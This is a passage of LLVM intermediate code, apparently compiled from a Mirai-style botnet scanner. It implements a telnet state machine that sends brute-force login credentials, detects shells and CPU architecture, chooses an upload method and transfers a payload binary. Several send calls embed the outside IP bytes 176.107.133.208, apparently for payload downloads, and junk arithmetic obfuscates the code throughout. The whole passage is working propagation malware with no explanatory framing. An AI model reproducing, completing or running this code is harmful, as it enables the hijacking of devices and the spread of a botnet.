  %794 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %793, i32 0, i32 4
  %795 = load i32, i32* %794, align 8
  %796 = add i32 8192, -1286646165
  %797 = sub i32 %796, %795
  %798 = sub i32 %797, -1286646165
  %799 = sub nsw i32 8192, %795
  %800 = call i32 @recv_strip_null(i32 %784, i8* %792, i32 %798, i32 16384)
  store i32 %800, i32* %34, align 4
  %801 = load i32, i32* %34, align 4
  %802 = icmp eq i32 %801, 0
  br i1 %802, label %803, label %805

; <label>:803:                                    ; preds = %780
  %804 = call i32* @__errno_location() #9
  store i32 104, i32* %804, align 4
  store i32 -1, i32* %34, align 4
  br label %805

; <label>:805:                                    ; preds = %803, %780
  %806 = load i32, i32* %34, align 4
  %807 = icmp eq i32 %806, -1
  br i1 %807, label %808, label %838

; <label>:808:                                    ; preds = %805
  %809 = call i32* @__errno_location() #9
  %810 = load i32, i32* %809, align 4
  %811 = icmp ne i32 %810, 11
  br i1 %811, label %812, label %837

; <label>:812:                                    ; preds = %808
  %813 = call i32* @__errno_location() #9
  %814 = load i32, i32* %813, align 4
  %815 = icmp ne i32 %814, 11
  br i1 %815, label %816, label %837

; <label>:816:                                    ; preds = %812
  %817 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %818 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %817, i32 0, i32 2
  %819 = load i32, i32* %818, align 8
  %820 = call i32 @close(i32 %819)
  %821 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %822 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %821, i32 0, i32 2
  store i32 -1, i32* %822, align 8
  %823 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %824 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %823, i32 0, i32 9
  %825 = load i8, i8* %824, align 4
  %826 = sub i8 %825, 114
  %827 = add i8 %826, 1
  %828 = add i8 %827, 114
  %829 = add i8 %825, 1
  store i8 %828, i8* %824, align 4
  %830 = zext i8 %828 to i32
  %831 = icmp sge i32 %830, 10
  br i1 %831, label %832, label %834

; <label>:832:                                    ; preds = %816
  %833 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %833, i32 1)
  br label %836

; <label>:834:                                    ; preds = %816
  %835 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %835)
  br label %836

; <label>:836:                                    ; preds = %834, %832
  br label %837

; <label>:837:                                    ; preds = %836, %812, %808
  br label %1316

; <label>:838:                                    ; preds = %805
  %839 = load i32, i32* %34, align 4
  %840 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %841 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %840, i32 0, i32 4
  %842 = load i32, i32* %841, align 8
  %843 = sub i32 0, %839
  %844 = sub i32 %842, %843
  %845 = add nsw i32 %842, %839
  store i32 %844, i32* %841, align 8
  %846 = load i32, i32* @fake_time, align 4
  %847 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %848 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %847, i32 0, i32 3
  store i32 %846, i32* %848, align 4
  br label %849

; <label>:849:                                    ; preds = %1314, %838
  store i32 0, i32* %35, align 4
  %850 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %851 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %850, i32 0, i32 16
  %852 = load i32, i32* %851, align 8
  switch i32 %852, label %1270 [
    i32 2, label %853
    i32 3, label %861
    i32 4, label %878
    i32 5, label %895
    i32 6, label %937
    i32 7, label %986
    i32 8, label %1004
    i32 9, label %1017
    i32 10, label %1065
    i32 12, label %1095
    i32 11, label %1143
    i32 13, label %1221
  ]

; <label>:853:                                    ; preds = %849
  %854 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %855 = call i32 @consume_iacs(%struct.scanner_connection* %854)
  store i32 %855, i32* %35, align 4
  %856 = icmp sgt i32 %855, 0
  br i1 %856, label %857, label %860

; <label>:857:                                    ; preds = %853
  %858 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %859 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %858, i32 0, i32 16
  store i32 3, i32* %859, align 8
  br label %860

; <label>:860:                                    ; preds = %857, %853
  br label %1271

; <label>:861:                                    ; preds = %849
  %862 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %863 = call i32 @consume_login_prompt(%struct.scanner_connection* %862, i32 1)
  store i32 %863, i32* %35, align 4
  %864 = icmp sgt i32 %863, 0
  br i1 %864, label %865, label %877

; <label>:865:                                    ; preds = %861
  %866 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %867 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %866, i32 0, i32 2
  %868 = load i32, i32* %867, align 8
  %869 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %869, i32 0, i32 0
  %871 = load %struct.scanner_auth*, %struct.scanner_auth** %870, align 8
  %872 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %871, i32 0, i32 0
  %873 = load i8*, i8** %872, align 8
  %874 = call i32 (i32, i8*, ...) @fdsend(i32 %868, i8* %873)
  %875 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %876 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %875, i32 0, i32 16
  store i32 4, i32* %876, align 8
  br label %877

; <label>:877:                                    ; preds = %865, %861
  br label %1271

; <label>:878:                                    ; preds = %849
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %880 = call i32 @consume_login_prompt(%struct.scanner_connection* %879, i32 0)
  store i32 %880, i32* %35, align 4
  %881 = icmp sgt i32 %880, 0
  br i1 %881, label %882, label %894

; <label>:882:                                    ; preds = %878
  %883 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %884 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %883, i32 0, i32 2
  %885 = load i32, i32* %884, align 8
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 0
  %888 = load %struct.scanner_auth*, %struct.scanner_auth** %887, align 8
  %889 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %888, i32 0, i32 1
  %890 = load i8*, i8** %889, align 8
  %891 = call i32 (i32, i8*, ...) @fdsend(i32 %885, i8* %890)
  %892 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %892, i32 0, i32 16
  store i32 5, i32* %893, align 8
  br label %894

; <label>:894:                                    ; preds = %882, %878
  br label %1271

; <label>:895:                                    ; preds = %849
  %896 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %897 = call i32 @consume_shell_prompt(%struct.scanner_connection* %896)
  store i32 %897, i32* %35, align 4
  %898 = icmp sgt i32 %897, 0
  br i1 %898, label %899, label %911

; <label>:899:                                    ; preds = %895
  call void @table_unlock_val(i8 zeroext 11)
  %900 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %901 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %900, i32 0, i32 2
  %902 = load i32, i32* %901, align 8
  %903 = call i32 (i32, i8*, ...) @fdsend(i32 %902, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i32 0, i32 0))
  %904 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %904, i32 0, i32 2
  %906 = load i32, i32* %905, align 8
  %907 = call i8* @table_retrieve_val(i32 11, i32* null)
  %908 = call i32 (i32, i8*, ...) @fdsend(i32 %906, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* %907)
  call void @table_lock_val(i8 zeroext 11)
  %909 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %910 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %909, i32 0, i32 16
  store i32 6, i32* %910, align 8
  br label %936

; <label>:911:                                    ; preds = %895
  %912 = load i32, i32* %35, align 4
  %913 = icmp eq i32 %912, -1
  br i1 %913, label %914, label %935

; <label>:914:                                    ; preds = %911
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %915, i32 0, i32 2
  %917 = load i32, i32* %916, align 8
  %918 = call i32 @close(i32 %917)
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %920 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %919, i32 0, i32 2
  store i32 -1, i32* %920, align 8
  %921 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %922 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %921, i32 0, i32 9
  %923 = load i8, i8* %922, align 4
  %924 = add i8 %923, 1
  %925 = add i8 %924, 1
  %926 = sub i8 %925, 1
  %927 = add i8 %923, 1
  store i8 %926, i8* %922, align 4
  %928 = zext i8 %926 to i32
  %929 = icmp eq i32 %928, 10
  br i1 %929, label %930, label %932

; <label>:930:                                    ; preds = %914
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %931, i32 1)
  br label %934

; <label>:932:                                    ; preds = %914
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %933)
  br label %934

; <label>:934:                                    ; preds = %932, %930
  br label %935

; <label>:935:                                    ; preds = %934, %911
  br label %936

; <label>:936:                                    ; preds = %935, %899
  br label %1271

; <label>:937:                                    ; preds = %849
  %938 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %939 = call i32 @consume_resp_prompt(%struct.scanner_connection* %938)
  store i32 %939, i32* %35, align 4
  %940 = icmp sgt i32 %939, 0
  br i1 %940, label %941, label %985

; <label>:941:                                    ; preds = %937
  %942 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %943 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %942, i32 0, i32 5
  store i32 0, i32* %943, align 4
  %944 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %945 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %944, i32 0, i32 1
  %946 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %945, i32 0, i32 0
  %947 = load i32, i32* %946, align 8
  %948 = icmp ne i32 %947, 0
  br i1 %948, label %956, label %949

; <label>:949:                                    ; preds = %941
  %950 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %951 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %950, i32 0, i32 2
  %952 = load i32, i32* %951, align 8
  %953 = call i32 (i32, i8*, ...) @fdsend(i32 %952, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i32 0, i32 0))
  %954 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %955 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %954, i32 0, i32 16
  store i32 7, i32* %955, align 8
  br label %984

; <label>:956:                                    ; preds = %941
  %957 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %958 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %957, i32 0, i32 8
  %959 = getelementptr inbounds [16 x i8], [16 x i8]* %958, i32 0, i32 0
  %960 = call i32 @strcmp(i8* %959, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %961 = icmp ne i32 %960, 0
  br i1 %961, label %962, label %968

; <label>:962:                                    ; preds = %956
  %963 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %964 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %963, i32 0, i32 8
  %965 = getelementptr inbounds [16 x i8], [16 x i8]* %964, i32 0, i32 0
  %966 = call i32 @strcmp(i8* %965, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #10
  %967 = icmp ne i32 %966, 0
  br i1 %967, label %976, label %968

; <label>:968:                                    ; preds = %962, %956
  call void @table_unlock_val(i8 zeroext 11)
  %969 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %970 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %969, i32 0, i32 2
  %971 = load i32, i32* %970, align 8
  %972 = call i8* @table_retrieve_val(i32 11, i32* null)
  %973 = call i32 (i32, i8*, ...) @fdsend(i32 %971, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i32 0, i32 0), i8* %972)
  call void @table_lock_val(i8 zeroext 11)
  %974 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %975 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %974, i32 0, i32 16
  store i32 8, i32* %975, align 8
  br label %1271

; <label>:976:                                    ; preds = %962
  call void @table_unlock_val(i8 zeroext 11)
  %977 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %978 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %977, i32 0, i32 2
  %979 = load i32, i32* %978, align 8
  %980 = call i8* @table_retrieve_val(i32 11, i32* null)
  %981 = call i32 (i32, i8*, ...) @fdsend(i32 %979, i8* %980)
  call void @table_lock_val(i8 zeroext 11)
  %982 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %983 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %982, i32 0, i32 16
  store i32 9, i32* %983, align 8
  br label %984

; <label>:984:                                    ; preds = %976, %949
  br label %985

; <label>:985:                                    ; preds = %984, %937
  br label %1271

; <label>:986:                                    ; preds = %849
  %987 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %988 = call i32 @parse_elf_response(%struct.scanner_connection* %987)
  store i32 %988, i32* %35, align 4
  %989 = icmp sgt i32 %988, 0
  br i1 %989, label %990, label %995

; <label>:990:                                    ; preds = %986
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 1
  %993 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %992, i32 0, i32 0
  store i32 1, i32* %993, align 8
  %994 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %994)
  br label %1003

; <label>:995:                                    ; preds = %986
  %996 = load i32, i32* %35, align 4
  %997 = icmp eq i32 %996, -1
  br i1 %997, label %998, label %1002

; <label>:998:                                    ; preds = %995
  %999 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1000 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %999, i32 0, i32 9
  store i8 0, i8* %1000, align 4
  %1001 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1001, i32 1)
  br label %1002

; <label>:1002:                                   ; preds = %998, %995
  br label %1003

; <label>:1003:                                   ; preds = %1002, %990
  br label %1271

; <label>:1004:                                   ; preds = %849
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1006 = call i32 @consume_arm_subtype(%struct.scanner_connection* %1005)
  store i32 %1006, i32* %35, align 4
  %1007 = icmp sgt i32 %1006, 0
  br i1 %1007, label %1008, label %1016

; <label>:1008:                                   ; preds = %1004
  call void @table_unlock_val(i8 zeroext 11)
  %1009 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1010 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1009, i32 0, i32 2
  %1011 = load i32, i32* %1010, align 8
  %1012 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1013 = call i32 (i32, i8*, ...) @fdsend(i32 %1011, i8* %1012)
  call void @table_lock_val(i8 zeroext 11)
  %1014 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1015 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1014, i32 0, i32 16
  store i32 9, i32* %1015, align 8
  br label %1016

; <label>:1016:                                   ; preds = %1008, %1004
  br label %1271

; <label>:1017:                                   ; preds = %849
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1019 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1018)
  store i32 %1019, i32* %35, align 4
  %1020 = icmp sgt i32 %1019, 0
  br i1 %1020, label %1021, label %1064

; <label>:1021:                                   ; preds = %1017
  %1022 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1023 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1022, i32 0, i32 15
  %1024 = load i32, i32* %1023, align 4
  %1025 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1026 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1025, i32 0, i32 13
  %1027 = load i16, i16* %1026, align 8
  %1028 = zext i16 %1027 to i32
  %1029 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1024, i32 %1028, %struct.scanner_connection* %1029, i32 0)
  store i32 0, i32* %36, align 4
  br label %1030

; <label>:1030:                                   ; preds = %1046, %1021
  %1031 = load i32, i32* %36, align 4
  %1032 = icmp slt i32 %1031, 15
  br i1 %1032, label %1033, label %1052

; <label>:1033:                                   ; preds = %1030
  %1034 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1035 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1034, i32 0, i32 2
  %1036 = load i32, i32* %1035, align 8
  %1037 = load i32, i32* %36, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %1038
  %1040 = load i8*, i8** %1039, align 8
  %1041 = load i32, i32* %36, align 4
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %1042
  %1044 = load i8*, i8** %1043, align 8
  %1045 = call i32 (i32, i8*, ...) @fdsend(i32 %1036, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i32 0, i32 0), i8* %1040, i8* %1044)
  br label %1046

; <label>:1046:                                   ; preds = %1033
  %1047 = load i32, i32* %36, align 4
  %1048 = add i32 %1047, 1428451980
  %1049 = add i32 %1048, 1
  %1050 = sub i32 %1049, 1428451980
  %1051 = add nsw i32 %1047, 1
  store i32 %1050, i32* %36, align 4
  br label %1030

; <label>:1052:                                   ; preds = %1030
  %1053 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1054 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1053, i32 0, i32 2
  %1055 = load i32, i32* %1054, align 8
  %1056 = call i32 (i32, i8*, ...) @fdsend(i32 %1055, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 11)
  %1057 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1058 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1057, i32 0, i32 2
  %1059 = load i32, i32* %1058, align 8
  %1060 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1061 = call i32 (i32, i8*, ...) @fdsend(i32 %1059, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i32 0, i32 0), i8* %1060)
  call void @table_lock_val(i8 zeroext 11)
  %1062 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1063 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1062, i32 0, i32 16
  store i32 10, i32* %1063, align 8
  br label %1064

; <label>:1064:                                   ; preds = %1052, %1017
  br label %1271

; <label>:1065:                                   ; preds = %849
  %1066 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1067 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1066)
  store i32 %1067, i32* %35, align 4
  %1068 = icmp sgt i32 %1067, 0
  br i1 %1068, label %1069, label %1094

; <label>:1069:                                   ; preds = %1065
  %1070 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1071 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1070, i32 0, i32 8
  %1072 = getelementptr inbounds [16 x i8], [16 x i8]* %1071, i32 0, i32 0
  %1073 = call i32 @strcmp(i8* %1072, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0)) #10
  %1074 = icmp eq i32 %1073, 0
  br i1 %1074, label %1075, label %1086

; <label>:1075:                                   ; preds = %1069
  call void @table_unlock_val(i8 zeroext 11)
  %1076 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1077 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1076, i32 0, i32 2
  %1078 = load i32, i32* %1077, align 8
  %1079 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1080 = call i32 (i32, i8*, ...) @fdsend(i32 %1078, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %1079)
  call void @table_lock_val(i8 zeroext 11)
  %1081 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1082 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1081, i32 0, i32 1
  %1083 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1082, i32 0, i32 1
  store i32 3, i32* %1083, align 4
  %1084 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1085 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1084, i32 0, i32 16
  store i32 13, i32* %1085, align 8
  br label %1271

; <label>:1086:                                   ; preds = %1069
  call void @table_unlock_val(i8 zeroext 11)
  %1087 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1088 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1087, i32 0, i32 2
  %1089 = load i32, i32* %1088, align 8
  %1090 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1091 = call i32 (i32, i8*, ...) @fdsend(i32 %1089, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i32 0, i32 0), i8* %1090)
  call void @table_lock_val(i8 zeroext 11)
  %1092 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1093 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1092, i32 0, i32 16
  store i32 12, i32* %1093, align 8
  br label %1094

; <label>:1094:                                   ; preds = %1086, %1065
  br label %1271

; <label>:1095:                                   ; preds = %849
  %1096 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1097 = call i32 @connection_consume_upload_methods(%struct.scanner_connection* %1096)
  store i32 %1097, i32* %35, align 4
  %1098 = load i32, i32* %35, align 4
  %1099 = icmp ne i32 %1098, 0
  br i1 %1099, label %1100, label %1142

; <label>:1100:                                   ; preds = %1095
  call void @table_unlock_val(i8 zeroext 11)
  %1101 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1101, i32 0, i32 1
  %1103 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1102, i32 0, i32 1
  %1104 = load i32, i32* %1103, align 4
  switch i32 %1104, label %1129 [
    i32 0, label %1105
    i32 1, label %1111
    i32 2, label %1120
  ]

; <label>:1105:                                   ; preds = %1100
  %1106 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1107 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1106, i32 0, i32 2
  %1108 = load i32, i32* %1107, align 8
  %1109 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1110 = call i32 (i32, i8*, ...) @fdsend(i32 %1108, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i32 0, i32 0), i8* %1109)
  br label %1129

; <label>:1111:                                   ; preds = %1100
  %1112 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1112, i32 0, i32 2
  %1114 = load i32, i32* %1113, align 8
  %1115 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1116 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1115, i32 0, i32 8
  %1117 = getelementptr inbounds [16 x i8], [16 x i8]* %1116, i32 0, i32 0
  %1118 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1119 = call i32 (i32, i8*, ...) @fdsend(i32 %1114, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i8* %1117, i8* %1118)
  br label %1129

; <label>:1120:                                   ; preds = %1100
  %1121 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1122 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1121, i32 0, i32 2
  %1123 = load i32, i32* %1122, align 8
  %1124 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1124, i32 0, i32 8
  %1126 = getelementptr inbounds [16 x i8], [16 x i8]* %1125, i32 0, i32 0
  %1127 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1128 = call i32 (i32, i8*, ...) @fdsend(i32 %1123, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i32 0, i32 0), i8* %1126, i32 176, i32 107, i32 133, i32 208, i8* %1127)
  br label %1129

; <label>:1129:                                   ; preds = %1120, %1111, %1105, %1100
  call void @table_lock_val(i8 zeroext 11)
  %1130 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1130, i32 0, i32 1
  %1132 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1131, i32 0, i32 1
  %1133 = load i32, i32* %1132, align 4
  %1134 = icmp ne i32 %1133, 0
  br i1 %1134, label %1135, label %1138

; <label>:1135:                                   ; preds = %1129
  %1136 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1137 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1136, i32 0, i32 16
  store i32 13, i32* %1137, align 8
  br label %1141

; <label>:1138:                                   ; preds = %1129
  %1139 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1139, i32 0, i32 16
  store i32 11, i32* %1140, align 8
  br label %1141

; <label>:1141:                                   ; preds = %1138, %1135
  br label %1142

; <label>:1142:                                   ; preds = %1141, %1095
  br label %1271

; <label>:1143:                                   ; preds = %849
  %1144 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1145 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1144)
  store i32 %1145, i32* %35, align 4
  %1146 = icmp sgt i32 %1145, 0
  br i1 %1146, label %1147, label %1220

; <label>:1147:                                   ; preds = %1143
  %1148 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1149 = call %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %1148)
  store %struct.payload* %1149, %struct.payload** %6, align 8
  %1150 = load %struct.payload*, %struct.payload** %6, align 8
  %1151 = icmp ne %struct.payload* %1150, null
  br i1 %1151, label %1154, label %1152

; <label>:1152:                                   ; preds = %1147
  %1153 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1153, i32 1)
  br label %1271

; <label>:1154:                                   ; preds = %1147
  %1155 = load %struct.payload*, %struct.payload** %6, align 8
  %1156 = call %struct.binary* @process_retrieve_binary(%struct.payload* %1155)
  store %struct.binary* %1156, %struct.binary** %7, align 8
  %1157 = load %struct.binary*, %struct.binary** %7, align 8
  %1158 = icmp ne %struct.binary* %1157, null
  br i1 %1158, label %1161, label %1159

; <label>:1159:                                   ; preds = %1154
  %1160 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1160, i32 1)
  br label %1271

; <label>:1161:                                   ; preds = %1154
  call void @table_unlock_val(i8 zeroext 11)
  %1162 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1163 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1162, i32 0, i32 2
  %1164 = load i32, i32* %1163, align 8
  %1165 = load %struct.binary*, %struct.binary** %7, align 8
  %1166 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1167 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1166, i32 0, i32 12
  %1168 = load i8, i8* %1167, align 1
  %1169 = zext i8 %1168 to i64
  %1170 = getelementptr inbounds %struct.binary, %struct.binary* %1165, i64 %1169
  %1171 = getelementptr inbounds %struct.binary, %struct.binary* %1170, i32 0, i32 0
  %1172 = load i8*, i8** %1171, align 8
  %1173 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1174 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1173, i32 0, i32 12
  %1175 = load i8, i8* %1174, align 1
